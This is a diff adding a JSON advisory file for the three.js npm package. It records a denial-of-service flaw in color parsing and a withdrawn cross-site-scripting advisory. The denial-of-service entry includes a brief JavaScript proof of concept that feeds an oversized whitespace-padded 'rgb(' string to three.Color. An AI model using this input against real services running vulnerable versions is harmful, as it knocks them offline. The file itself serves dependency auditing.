@@ -1,0 +1,48 @@
+{
+  "name": "three",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-fq6p-x6j3-cmmq",
+      "title": "Denial of service in three",
+      "description": "This affects the package three before 0.125.0. This can happen when handling rgb or hsl colors. \n\n**PoC:** \n```js\nvar three = require('three')\nfunction build_blank(n) {\n    var ret = \"rgb(\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"\";\n}\nvar Color = three.Color\nvar time = Date.now();\nnew Color(build_blank(50000)) var time_cost = Date.now() - time;\nconsole.log(time_cost + \" ms\")\n```",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-fq6p-x6j3-cmmq",
+      "publishedAt": "2021-03-01T19:57:16Z",
+      "modifiedAt": "2023-09-11T16:30:56Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-fq6p-x6j3-cmmq"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2020-28496"
+        }
+      ],
+      "affectedRange": "< 0.125.0",
+      "fixedVersion": "0.125.0"
+    },
+    {
+      "id": "GHSA-7vvq-7r29-5vg3",
+      "title": "Cross site scripting in three.js",
+      "description": "# CVE has been withdrawn\n\nVersions of three.js prior to 0.137.0 load untrusted iframes and allow for attackers to inject arbitrary javascript into a users browser.\n\n",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-7vvq-7r29-5vg3",
+      "publishedAt": "2022-01-27T16:00:48Z",
+      "modifiedAt": "2023-02-03T05:05:18Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-7vvq-7r29-5vg3"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2022-0177"
+        }
+      ],
+      "affectedRange": "< 0.137.0",
+      "fixedVersion": "0.137.0"
+    }
+  ]
+}
